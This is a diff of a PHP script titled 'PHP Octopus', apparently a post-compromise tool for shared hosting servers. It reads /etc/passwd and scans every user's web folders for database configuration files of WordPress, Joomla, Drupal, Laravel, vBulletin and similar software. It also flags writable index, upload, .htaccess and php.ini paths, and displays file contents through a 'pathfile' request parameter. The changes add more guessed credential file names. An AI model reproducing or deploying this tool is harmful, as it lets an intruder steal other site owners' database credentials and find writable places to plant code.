@@ -23,9 +23,12 @@ if(isset($_GET['pathfile'])&&!empty($_GET['pathfile'])){
     <script type="application/javascript" src="https://code.jquery.com/ui/1.12.0/jquery-ui.js"></script>
     <script type="application/javascript">
         $(document).ready(function() {
-            $('#table').DataTable();
+            $('a.modalasz').click(function(){
+                e.preventDefault();
+            });
             $('#table').on( 'draw.dt', function () {
                 $('.modalasz').click(function () {
+
                     console.log('click');
                     if($(this).attr('data-path')!=""){
                         $.get("?pathfile="+$(this).attr('data-path'), function(data) {
@@ -36,16 +39,34 @@ if(isset($_GET['pathfile'])&&!empty($_GET['pathfile'])){
                     }
 
                     $('#myModal').dialog({
-                        width: 1000
+                        width: 1000,
+                        position: { my: 'top', at: 'top+50' },
                     });
+
                 });
             });
+            $('#table').DataTable({
+                "aaSorting": [
+                    [ 1, "desc" ],
+                    [ 3, "desc" ],
+                    [ 10, "desc" ],
+                    [ 9, "desc" ],
+                    [ 15, "desc" ],
+                    [ 16, "desc" ],
+                    [ 6, "desc" ],
+                    [ 7, "desc" ],
+                ]
+            });
+
         } );
     </script>
     <style>
         #myModal{
             background: black;
             color: #fff;
+        }
+        .modalasz{
+            cursor: pointer;
         }
     </style>
 </head>
@@ -54,8 +75,15 @@ if(isset($_GET['pathfile'])&&!empty($_GET['pathfile'])){
 <h1>PHP Octopus</h1>
 <?php
 
+if(file_exists('/home/principal/public_html/teste/octopus.php')){
+    echo "aaaapaaaa";
+}else{
+    echo "nao vaiiii";
+}
+
 if(@file('/etc/passwd')){
-$users = file('/etc/passwd');
+    $users = file('/etc/passwd');
+
 
     $count['pathindex']=0;
     $count['pathpublicwritter']=0;
@@ -78,9 +106,7 @@ $users = file('/etc/passwd');
 <table id="table" class="display" cellspacing="0" width="100%">
     <thead>
     <tr>
-        <th>
-            id
-        </th>
+
         <th>
             user
         </th>
@@ -88,43 +114,43 @@ $users = file('/etc/passwd');
             index.php
         </th>
         <th>
-            public writter
+            root user writter
         </th>
         <th>
-            Default
+            files of config database
         </th>
         <th>
-            Drupal 6
+            file of config Drupal 6
         </th>
         <th>
-            Drupal 7
+            file of config Drupal 7
         </th>
         <th>
-            write joom up
+            writer folder /image/ or /tmp/ Joomla
         </th>
         <th>
-            write wp up
+            writer folder /uploads/ WordPress
         </th>
         <th>
-            vb
+            file of config vbulletin
         </th>
         <th>
-            joo
+            file of config joomla
         </th>
         <th>
-            wp
+            file of config WordPress
         </th>
         <th>
-            laravel
+            file of config Laravel
         </th>
         <th>
-            codeigniter
+            file of config Codeigniter
         </th>
         <th>
-            symfony
+            file of config Symfony
         </th>
         <th>
-            zend
+            file of config Zend Framework
         </th>
         <th>
             htaccess
@@ -136,53 +162,51 @@ $users = file('/etc/passwd');
     </thead>
     <tfoot>
     <tr>
-        <th>
-            id
-        </th>
+
         <th>
             user
-        </th>
-        <th>
-            public writter
         </th>
         <th>
             index.php
         </th>
         <th>
-            Default
+            root user writter
         </th>
         <th>
-            Drupal 6
+            files of config database
         </th>
         <th>
-            Drupal 7
+            file of config Drupal 6
+        </th>
+        <th>
+            file of config Drupal 7
         </th>
         <th>
             write joom up
         </th>
         <th>
-            write wp up
+            writer folder /uploads/
         </th>
         <th>
-            vb
+            file of config vbulletin
         </th>
         <th>
-            joo
+            file of config joomla
         </th>
         <th>
-            wp
+            file of config WordPress
         </th>
         <th>
-            laravel
+            file of config Laravel
         </th>
         <th>
-            codeigniter
+            file of config Codeigniter
         </th>
         <th>
-            symfony
+            file of config Symfony
         </th>
         <th>
-            zend
+            file of config Zend Framework
         </th>
         <th>
             htaccess
@@ -201,11 +225,8 @@ $users = file('/etc/passwd');
     $homes[]="home4";
     $homes[]="home5";
 
-
-    $public_folders[]="www";
     $public_folders[]="public_html";
-
-
+    $public_folders[]="www";
 
     foreach($homes as $keyHome=>$home) {
         foreach($users as $key=> $user) {
@@ -220,9 +241,7 @@ $users = file('/etc/passwd');
                     ?>
 
                     <tr>
-                        <td>
-                            <?php echo $key; ?>
-                        </td>
+
                         <td>
                             <?php echo $userfinal[0]; ?>
                         </td>
@@ -232,20 +251,21 @@ $users = file('/etc/passwd');
                             if (file_exists($pathindex)) {
                                 $count['pathindex']++;
                                 ?>
-                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathindex; ?>"
-                                   href="#">
+                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathindex; ?>"
+                                   >
                                     &#10004;
-                                </a>
+                                </span>
                                 <?php
                             }
                             if (is_writable($pathindex)) {
-                                echo "w";
+
                                 $count['pathindex']++;
                                 ?>
-                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathindex; ?>"
-                                   href="#">
+                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathindex; ?>"
+                                   >
                                     &#10004;
-                                </a>
+                                </span>
+                                w
                                 <?php
                             }
                             ?>
@@ -254,13 +274,14 @@ $users = file('/etc/passwd');
                             <?php
                             $pathpublicwritter = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/';
                             if (is_writable($pathpublicwritter)) {
-                                echo "w";
+
                                 $count['pathpublicwritter']++;
                                 ?>
-                                <a id="teste" class="btn btn-info modalasz"
-                                   data-path="<?php echo $pathpublicwritter; ?>" href="#">
+                                <span id="teste" class="btn btn-info modalasz"
+                                   data-path="<?php echo $pathpublicwritter; ?>">
                                     &#10004;
-                                </a>
+                                </span>
+                                w
                                 <?php
                             }
                             ?>
@@ -277,21 +298,32 @@ $users = file('/etc/passwd');
                             $folderDefaults[] = "config/";
                             $folderDefaults[] = "configs/";
                             $folderDefaults[] = "common/";
+                            $folderDefaults[] = "classes/";
+                            $folderDefaults[] = "class/";
                             $folderDefaults[] = "site/";
+                            $folderDefaults[] = "admin/";
+                            $folderDefaults[] = "adm/";
                             foreach ($folderDefaults as $keyFolder => $folderDefault) {
                                 if ($keyFolder != 0) {
                                     $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'configuration.php';
                                 }
+                                $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'dbconnect.php';
                                 $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'application.ini';
                                 $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'config.php';
                                 $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'database.php';
                                 $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'conexao.php';
+                                $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'conexaodb.php';
+                                $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'conexaoDB.php';
                                 $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'connection.php';
                                 $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'conectar.php';
                                 $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'conecta.php';
                                 $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'db.php';
+                                $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'DB.php';
                                 $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'bd.php';
+                                $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'connectDB.php';
+                                $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'connectdb.php';
                                 $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'con.php';
+                                $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'defines.php';
                                 $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'conn.php';
                                 $url[] = '/' . $home . '/' . $userfinal[0] . '/' . $public_folder . '/' . $folderDefault . 'configuracao.php';
                             }
@@ -306,9 +338,9 @@ $users = file('/etc/passwd');
                                     $count['folderDefault']++;
 
                                     ?>
-                                    <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $u; ?>" href="#">
+                                    <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $u; ?>" >
                                         &#10004;
-                                    </a>
+                                    </span>
                                     <?php
                                 }
                             }
@@ -321,10 +353,10 @@ $users = file('/etc/passwd');
                             if (file_exists($pathconfd6)) {
                                 $count['pathconfd6']++;
                                 ?>
-                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathconfd6; ?>"
-                                   href="#">
+                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathconfd6; ?>"
+                                   >
                                     &#10004;
-                                </a>
+                                </span>
                                 <?php
                             }
                             ?>
@@ -335,10 +367,10 @@ $users = file('/etc/passwd');
                             if (file_exists($pathconfd7)) {
                                 $count['pathconfd7']++;
                                 ?>
-                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathconfd7; ?>"
-                                   href="#">
+                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathconfd7; ?>"
+                                   >
                                     &#10004;
-                                </a>
+                                </span>
                                 <?php
                             }
                             ?>
@@ -346,12 +378,13 @@ $users = file('/etc/passwd');
                         <td>
                             <?php
                             if ((is_writable('/' . $home . '/' . $userfinal[0] . '/'.$public_folder.'/images/')) OR (is_writable('/home/' . $userfinal[0] . '/'.$public_folder.'/tmp/'))) {
-                                echo "w";
+
                                 $count['pathWriterJoo']++;
                                 ?>
-                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo ""; ?>" href="#">
+                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo ""; ?>" >
                                     &#10004;
-                                </a>
+                                </span>
+                                w
                                 <?php
                             }
                             ?>
@@ -359,12 +392,13 @@ $users = file('/etc/passwd');
                         <td>
                             <?php
                             if (is_writable('/' . $home . '/' . $userfinal[0] . '/'.$public_folder.'/wp-content/uploads/')) {
-                                echo "w";
+
                                 $count['pathWriterWp']++;
                                 ?>
-                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo ""; ?>" href="#">
+                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo ""; ?>" >
                                     &#10004;
-                                </a>
+                                </span>
+                                w
                                 <?php
                             }
                             ?>
@@ -376,10 +410,10 @@ $users = file('/etc/passwd');
                             if (file_exists($pathconfvb)) {
                                 $count['pathVb']++;
                                 ?>
-                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathconfvb; ?>"
-                                   href="#">
+                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathconfvb; ?>"
+                                   >
                                     &#10004;
-                                </a>
+                                </span>
                                 <?php
                             }
                             ?>
@@ -391,10 +425,10 @@ $users = file('/etc/passwd');
                             if (file_exists($pathconfjoom)) {
                                 $count['pathJoo']++;
                                 ?>
-                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathconfjoom; ?>"
-                                   href="#">
+                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathconfjoom; ?>"
+                                   >
                                     &#10004;
-                                </a>
+                                </span>
                                 <?php
                             }
                             ?>
@@ -406,10 +440,10 @@ $users = file('/etc/passwd');
                             if (file_exists($pathwpconfig)) {
                                 $count['pathWp']++;
                                 ?>
-                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathwpconfig; ?>"
-                                   href="#">
+                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathwpconfig; ?>"
+                                   >
                                     &#10004;
-                                </a>
+                                </span>
                                 <?php
                             }
                             ?>
@@ -421,10 +455,10 @@ $users = file('/etc/passwd');
                             if (file_exists($pathlaravel)) {
                                 $count['pathLaravel']++;
                                 ?>
-                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathlaravel; ?>"
-                                   href="#">
+                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathlaravel; ?>"
+                                   >
                                     &#10004;
-                                </a>
+                                </span>
                                 <?php
                             }
                             ?>
@@ -436,10 +470,10 @@ $users = file('/etc/passwd');
                             if (file_exists($pathcodeigniter)) {
                                 $count['pathCodeigniter']++;
                                 ?>
-                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathcodeigniter; ?>"
-                                   href="#">
+                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathcodeigniter; ?>"
+                                   >
                                     &#10004;
-                                </a>
+                                </span>
                                 <?php
                             }
                             ?>
@@ -451,10 +485,10 @@ $users = file('/etc/passwd');
                             if (file_exists($pathsymfony)) {
                                 $count['pathSymfony']++;
                                 ?>
-                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathsymfony; ?>"
-                                   href="#">
+                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathsymfony; ?>"
+                                   >
                                     &#10004;
-                                </a>
+                                </span>
                                 <?php
                             }
                             ?>
@@ -466,10 +500,10 @@ $users = file('/etc/passwd');
                             if (file_exists($pathzend)) {
                                 $count['pathZend']++;
                                 ?>
-                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathzend; ?>"
-                                   href="#">
+                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathzend; ?>"
+                                   >
                                     &#10004;
-                                </a>
+                                </span>
                                 <?php
                             }
                             ?>
@@ -479,23 +513,25 @@ $users = file('/etc/passwd');
                             <?php
                             $pathhtaccess = '/' . $home . '/' . $userfinal[0] . '/'.$public_folder.'/.htaccess';
                             if (file_exists($pathhtaccess)) {
-                                echo "r";
+
                                 $count['pathhtaccess']++;
                                 ?>
-                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathhtaccess; ?>"
-                                   href="#">
+                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathhtaccess; ?>"
+                                   >
                                     &#10004;
-                                </a>
+                                </span>
+                                r
                                 <?php
                             }
                             if (is_writable($pathhtaccess)) {
-                                echo "w";
+
                                 $count['pathhtaccess']++;
                                 ?>
-                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathhtaccess; ?>"
-                                   href="#">
+                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathhtaccess; ?>"
+                                   >
                                     &#10004;
-                                </a>
+                                </span>
+                                w
                                 <?php
                             }
                             ?>
@@ -507,19 +543,19 @@ $users = file('/etc/passwd');
                             if (file_exists($pathphpini)) {
                                 $count['pathphpini']++;
                                 ?>
-                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathphpini; ?>"
-                                   href="#">
+                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathphpini; ?>"
+                                   >
                                     &#10004;
-                                </a>
+                                </span>
                                 <?php
                             }
                             if (is_writable($pathphpini)) {
                                 $count['pathphpini']++;
                                 ?>
-                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathphpini; ?>"
-                                   href="#">
+                                <span id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathphpini; ?>"
+                                   >
                                     &#10004;
-                                </a>
+                                </span>
                                 <?php
                             }
                             ?>
@@ -598,8 +634,7 @@ $users = file('/etc/passwd');
             }
             echo $total;
             ?>
-
-            find sensibles files
+            sensitive files found
                 </h3>
 
         </li>
